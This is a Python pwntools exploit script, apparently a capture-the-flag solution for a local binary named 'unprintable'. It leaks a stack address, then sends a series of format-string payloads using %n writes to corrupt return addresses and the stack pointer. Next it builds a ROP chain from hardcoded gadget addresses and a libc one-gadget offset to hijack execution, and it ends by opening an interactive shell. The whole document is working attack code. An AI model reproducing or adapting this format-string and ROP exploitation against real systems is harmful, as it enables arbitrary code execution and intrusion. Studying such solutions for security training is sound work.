from pwn import *
context.log_level='debug'
context.arch='amd64'
p=process('./unprintable')

p.readuntil(": ")
stack=int(p.readline(),16)
log.warning(hex(stack))
"""
gdb.attach(p,'''
b printf
c
c
c
c
c
c
c
c
c
c
c
c
''')
"""
#aim=0x7fffffffda10-0x7fffffffdb20+stack:modify -->
array=0x600dd8
buf=0x000000000601060
main=0x000000000400726
repeat=0x0000000004007A3
gene=0x000000000400810
rdi=0x0000000000400833
rsi=0x0000000000400831
rbp=0x0000000000400690
adc=0x0000000004006E8#adc     [rbp+48h], edx
p6=0x00000000040082A
rsp_p3=0x000000000040082d
err=0x000000000601040
# rdi bss+0x200
# rsi system
p.send(('%{}d%26$hn'.format(buf+0x100-array).ljust(0x100)+p64(repeat)).ljust(0x1000,"\x00"))
p.send("%{}c%18$hhn%{}c%23$hhn".format(0x8,0xA3-8).ljust(0x1000,'\x00'))
p.send("%13$ln%{}c%23$hhn".format(0xA3).ljust(0x1000,'\x00'))
p.send("%{}c%23$hhn%{}c%13$hn".format(0xA3,0x1260-0xa3).ljust(0x1000,'\x00'))
# rsp ok 
p.send("%{}c%18$hhn%{}c%23$hhn".format(0xa,0xA3-0xa).ljust(0x1000,'\x00'))
p.send("%{}c%13$hhn%{}c%23$hhn".format(0x60,0xA3-0x60).ljust(0x1000,'\x00'))

call=buf+0x300
off=0x4526a+0x7ffff7a0d000-0x00007ffff7dd2540
aim=err
#final rop call [stderr]
rop=flat(p6,0,aim-0x48,call,off,0,0,gene)+flat(p6,0,0,err,0,0,0,gene)
pay="%{}c%23$hn".format(0x82d).ljust(0x200,'\x00')+p64(0)*3+rop
pay=pay.ljust(0x300,'\x00')+p64(adc)
p.send(pay.ljust(0x1000,'\x00'))
p.interactive()
